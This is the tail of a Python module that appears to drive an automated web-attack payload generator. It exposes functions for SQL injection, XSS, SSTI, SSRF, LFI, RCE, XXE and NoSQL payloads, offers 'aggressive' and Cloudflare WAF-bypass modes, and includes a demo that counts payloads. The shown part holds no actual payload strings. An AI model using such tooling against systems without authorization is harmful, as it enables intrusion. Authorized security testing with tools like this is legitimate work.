        'quick': PayloadMode.QUICK,
        'standard': PayloadMode.STANDARD,
        'thorough': PayloadMode.THOROUGH,
        'aggressive': PayloadMode.AGGRESSIVE,
    }
    
    context = PayloadContext(
        mode=mode_map.get(mode.lower(), PayloadMode.STANDARD),
        waf_type=waf_type,
        tech_stack=tech_stack or {}
    )
    
    return DynamicPayloadEngine(context)


# Convenience functions
def generate_sqli_payloads(
    mode: str = 'standard',
    waf_type: str = ''
) -> Generator[GeneratedPayload, None, None]:
    """Generate SQL injection payloads."""
    engine = create_engine(mode, waf_type)
    return engine.generate('sqli')


def generate_xss_payloads(
    mode: str = 'standard',
    waf_type: str = ''
) -> Generator[GeneratedPayload, None, None]:
    """Generate XSS payloads."""
    engine = create_engine(mode, waf_type)
    return engine.generate('xss')


def generate_all_payloads(
    mode: str = 'standard',
    waf_type: str = '',
    attack_types: list[str] = None
) -> dict[str, list[GeneratedPayload]]:
    """Generate payloads for multiple attack types."""
    attack_types = attack_types or ['sqli', 'xss', 'ssti', 'ssrf', 'lfi', 'rce', 'xxe', 'nosqli']
    engine = create_engine(mode, waf_type)
    
    results = {}
    for attack_type in attack_types:
        results[attack_type] = engine.generate_all(attack_type)
    
    return results


# Count payloads in each mode
def get_payload_counts() -> dict:
    """Get estimated payload counts for each mode."""
    counts = {}
    for mode_name in ['quick', 'standard', 'thorough', 'aggressive']:
        engine = create_engine(mode_name)
        total = 0
        for attack_type in ['sqli', 'xss', 'ssti', 'ssrf', 'lfi', 'rce', 'xxe', 'nosqli']:
            payloads = engine.generate_all(attack_type)
            total += len(payloads)
        counts[mode_name] = total
    return counts


if __name__ == "__main__":
    # Demo: Show payload counts
    print("=" * 70)
    print("DYNAMIC PAYLOAD ENGINE - PAYLOAD COUNTS")
    print("=" * 70)
    
    for mode in ['quick', 'standard', 'thorough', 'aggressive']:
        engine = create_engine(mode)
        total = 0
        print(f"\n{mode.upper()} MODE:")
        for attack_type in ['sqli', 'xss', 'ssti', 'ssrf', 'lfi', 'rce', 'xxe', 'nosqli']:
            payloads = engine.generate_all(attack_type)
            count = len(payloads)
            total += count
            print(f"  {attack_type:10}: {count:5} payloads")
        print(f"  {'TOTAL':10}: {total:5} payloads")
    
    print("\n" + "=" * 70)
    print("WITH WAF BYPASS (Cloudflare):")
    print("=" * 70)
    engine = create_engine('standard', waf_type='cloudflare')
    total = 0
    for attack_type in ['sqli', 'xss', 'ssti', 'ssrf', 'lfi', 'rce', 'xxe', 'nosqli']:
        payloads = engine.generate_all(attack_type)
        count = len(payloads)
        total += count
        print(f"  {attack_type:10}: {count:5} payloads")
    print(f"  {'TOTAL':10}: {total:5} payloads")
